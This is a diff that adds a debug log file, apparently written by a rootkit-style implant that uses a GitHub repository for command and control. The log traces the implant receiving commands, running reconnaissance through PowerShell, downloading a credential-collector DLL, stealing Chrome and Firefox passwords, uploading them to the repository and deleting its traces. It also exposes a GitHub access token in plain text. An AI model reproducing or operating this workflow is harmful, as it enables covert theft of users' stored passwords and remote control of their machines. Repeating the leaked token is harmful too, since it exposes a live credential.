@@ -1,0 +1,94 @@
+Sat Jul 31 16:03:32 2021. Initialisation of the log file.
+
+DEBUG: Sat Jul 31 16:03:32 2021: GithubLogin: hidemepls785
+DEBUG: Sat Jul 31 16:03:32 2021: GithubRepoName: furry-octo-parakeet
+DEBUG: Sat Jul 31 16:03:32 2021: GihubAccessToken: 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
+DEBUG: Sat Jul 31 16:03:32 2021: Rootkit Name: CorepPreprod
+DEBUG: Sat Jul 31 16:03:32 2021: Rootkit Registry Key: Sensors
+DEBUG: Sat Jul 31 16:03:32 2021: Run Registry Key Name: test
+DEBUG: Sat Jul 31 16:03:32 2021: Adding the actual location of the servant: C:\Windows\SysWOW64\svchost.exe
+DEBUG: Sat Jul 31 16:03:33 2021: The folder list for random folder is not empty. Its size is: 3118
+DEBUG: Sat Jul 31 16:03:33 2021: The random path choosed for this execution is: C:\Users\sophie\AppData\Local\Microsoft\VisualStudio\16.0_ae066bf5\STemplate\000d8c80-140b-4ac8-996e-756ffa80d400
+DEBUG: Sat Jul 31 16:03:33 2021: Start of a new loop to get commands and treat them.
+DEBUG: Sat Jul 31 16:03:33 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Sat Jul 31 16:03:33 2021: Success to get the instance number of the current instance: rootkit_path4
+DEBUG: Sat Jul 31 16:03:33 2021: Success to check the commands with rootkit_path4
+DEBUG: Sat Jul 31 16:03:33 2021: Getting this command from the github repo: execute_cmd dir C:\Users
+DEBUG: Sat Jul 31 16:03:33 2021: Getting this command from the github repo: password
+DEBUG: Sat Jul 31 16:03:33 2021: Getting this command from the github repo: execute_cmd wmic product get name,version
+DEBUG: Sat Jul 31 16:03:33 2021: Start to treat the commands sent by the github repo.
+DEBUG: Sat Jul 31 16:03:33 2021: Command received: execute_cmd
+DEBUG: Sat Jul 31 16:03:33 2021: The following command will be executed by powershell: dir C:\Users > C:\Users\sophie\AppData\Local\Microsoft\VisualStudio\16.0_ae066bf5\STemplate\000d8c80-140b-4ac8-996e-756ffa80d400\target_command.log
+DEBUG: Sat Jul 31 16:03:44 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Sat Jul 31 16:03:44 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Sat Jul 31 16:03:44 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Microsoft\VisualStudio\16.0_ae066bf5\STemplate\000d8c80-140b-4ac8-996e-756ffa80d400\target_command.log
+DEBUG: Sat Jul 31 16:03:44 2021: The file will be read as binary file.
+DEBUG: Sat Jul 31 16:03:44 2021: The file that will be read weight: 1044
+DEBUG: Sat Jul 31 16:03:44 2021: Success to read the binary file. This number of bytes have been read: 1045
+DEBUG: Sat Jul 31 16:03:44 2021: The files C:\Users\sophie\AppData\Local\Microsoft\VisualStudio\16.0_ae066bf5\STemplate\000d8c80-140b-4ac8-996e-756ffa80d400\target_command.log has been uploaded successfully in the github repo
+DEBUG: Sat Jul 31 16:03:44 2021: Success to delete the file that contains the output of the command.
+DEBUG: Sat Jul 31 16:03:44 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Sat Jul 31 16:03:44 2021: #####################################################
+
+DEBUG: Sat Jul 31 16:03:44 2021: Command received: password
+DEBUG: Sat Jul 31 16:03:44 2021: Start of the method messageManagerPasswordModule.
+DEBUG: Sat Jul 31 16:03:44 2021: Start of the method downloadFileFromGithubRepo with this file in the github repo: CredentialsCollectorDll.dll
+DEBUG: Sat Jul 31 16:03:46 2021: The answer of the github API seems to be correct for the file.
+DEBUG: Sat Jul 31 16:03:46 2021: The size of the content of the file is: 343040
+DEBUG: Sat Jul 31 16:03:46 2021: Start of the method writeFileWindowsApi.
+DEBUG: Sat Jul 31 16:03:46 2021: The content size that will be written: 343040
+DEBUG: Sat Jul 31 16:03:46 2021: Success to write the content(number of bytes : 343040) in the file : C:\Users\sophie\AppData\Local\Microsoft\VisualStudio\16.0_ae066bf5\STemplate\000d8c80-140b-4ac8-996e-756ffa80d400\CredentialsCollectorDll.dll
+DEBUG: Sat Jul 31 16:03:46 2021: Start of the method CredentialsDllHandlerMain with the file: C:\Users\sophie\AppData\Local\Microsoft\VisualStudio\16.0_ae066bf5\STemplate\000d8c80-140b-4ac8-996e-756ffa80d400\CredentialsCollectorDll.dll
+DEBUG: Sat Jul 31 16:03:46 2021: Success to have an handle to the credential dll.
+DEBUG: Sat Jul 31 16:03:46 2021: End of the execution of the password dll.
+DEBUG: Sat Jul 31 16:03:46 2021: The file that contains chrome passwords has been copied.
+DEBUG: Sat Jul 31 16:03:46 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Sat Jul 31 16:03:46 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Microsoft\VisualStudio\16.0_ae066bf5\STemplate\000d8c80-140b-4ac8-996e-756ffa80d400\chromepassword
+DEBUG: Sat Jul 31 16:03:46 2021: The file will be read as binary file.
+DEBUG: Sat Jul 31 16:03:46 2021: The file that will be read weight: 40960
+DEBUG: Sat Jul 31 16:03:46 2021: Success to read the binary file. This number of bytes have been read: 40961
+DEBUG: Sat Jul 31 16:03:46 2021: The files C:\Users\sophie\AppData\Local\Microsoft\VisualStudio\16.0_ae066bf5\STemplate\000d8c80-140b-4ac8-996e-756ffa80d400\chromepassword has been uploaded successfully in the github repo
+DEBUG: Sat Jul 31 16:03:46 2021: The files C:\Users\sophie\AppData\Local\Microsoft\VisualStudio\16.0_ae066bf5\STemplate\000d8c80-140b-4ac8-996e-756ffa80d400\chromepassword has been uploaded successfully in the github repo
+DEBUG: Sat Jul 31 16:03:46 2021: The file that contains passwords has been created.
+DEBUG: Sat Jul 31 16:03:46 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Sat Jul 31 16:03:46 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Microsoft\VisualStudio\16.0_ae066bf5\STemplate\000d8c80-140b-4ac8-996e-756ffa80d400\password_output.txt
+DEBUG: Sat Jul 31 16:03:46 2021: The file will be read as binary file.
+DEBUG: Sat Jul 31 16:03:46 2021: The file that will be read weight: 2236
+DEBUG: Sat Jul 31 16:03:46 2021: Success to read the binary file. This number of bytes have been read: 2237
+DEBUG: Sat Jul 31 16:03:47 2021: The files C:\Users\sophie\AppData\Local\Microsoft\VisualStudio\16.0_ae066bf5\STemplate\000d8c80-140b-4ac8-996e-756ffa80d400\password_output.txt has been uploaded successfully in the github repo
+DEBUG: Sat Jul 31 16:03:47 2021: The file that contains passwords has been created.
+DEBUG: Sat Jul 31 16:03:47 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Sat Jul 31 16:03:47 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Microsoft\VisualStudio\16.0_ae066bf5\STemplate\000d8c80-140b-4ac8-996e-756ffa80d400\firefoxpassword0
+DEBUG: Sat Jul 31 16:03:47 2021: The file will be read as binary file.
+DEBUG: Sat Jul 31 16:03:47 2021: The file that will be read weight: 665
+DEBUG: Sat Jul 31 16:03:47 2021: Success to read the binary file. This number of bytes have been read: 666
+DEBUG: Sat Jul 31 16:03:47 2021: The files C:\Users\sophie\AppData\Local\Microsoft\VisualStudio\16.0_ae066bf5\STemplate\000d8c80-140b-4ac8-996e-756ffa80d400\firefoxpassword0 has been uploaded successfully in the github repo
+DEBUG: Sat Jul 31 16:03:47 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: password_output.txt
+DEBUG: Sat Jul 31 16:03:47 2021: The file truely exists in the random folder.
+DEBUG: Sat Jul 31 16:03:47 2021: Success to delete the file. End of the method
+DEBUG: Sat Jul 31 16:03:47 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: chromepassword
+DEBUG: Sat Jul 31 16:03:47 2021: The file truely exists in the random folder.
+DEBUG: Sat Jul 31 16:03:47 2021: Success to delete the file. End of the method
+DEBUG: Sat Jul 31 16:03:47 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: CredentialsCollectorDll.dll
+DEBUG: Sat Jul 31 16:03:47 2021: The file truely exists in the random folder.
+ERROR: Sat Jul 31 16:03:47 2021: Fail to delete the file. Here is the last windows error: 5
+DEBUG: Sat Jul 31 16:03:47 2021: End of the method messageManagerPasswordModule.
+DEBUG: Sat Jul 31 16:03:47 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Sat Jul 31 16:03:47 2021: #####################################################
+
+DEBUG: Sat Jul 31 16:03:47 2021: Command received: execute_cmd
+DEBUG: Sat Jul 31 16:03:47 2021: The following command will be executed by powershell: wmic product get name,version > C:\Users\sophie\AppData\Local\Microsoft\VisualStudio\16.0_ae066bf5\STemplate\000d8c80-140b-4ac8-996e-756ffa80d400\target_command.log
+DEBUG: Sat Jul 31 16:03:57 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Sat Jul 31 16:03:57 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Sat Jul 31 16:03:57 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Microsoft\VisualStudio\16.0_ae066bf5\STemplate\000d8c80-140b-4ac8-996e-756ffa80d400\target_command.log
+DEBUG: Sat Jul 31 16:03:58 2021: The file will be read as binary file.
+DEBUG: Sat Jul 31 16:03:58 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Sat Jul 31 16:03:58 2021: There is no content returning by readFileWindowsApi. Aborting..
+DEBUG: Sat Jul 31 16:03:58 2021: Unable to delete the file that contains the output of the command.
+DEBUG: Sat Jul 31 16:03:58 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Sat Jul 31 16:03:58 2021: #####################################################
+
+DEBUG: Sat Jul 31 16:03:58 2021: Start of GithubCommunication::sendResults
+DEBUG: Sat Jul 31 16:03:59 2021: The results was uploaded on the github repo
+DEBUG: Sat Jul 31 16:03:59 2021: The receive method and the method to send the results return true, breaking the Servant Mission loop.
+DEBUG: Sat Jul 31 16:03:59 2021: Start of GithubCommunication::sendLogs
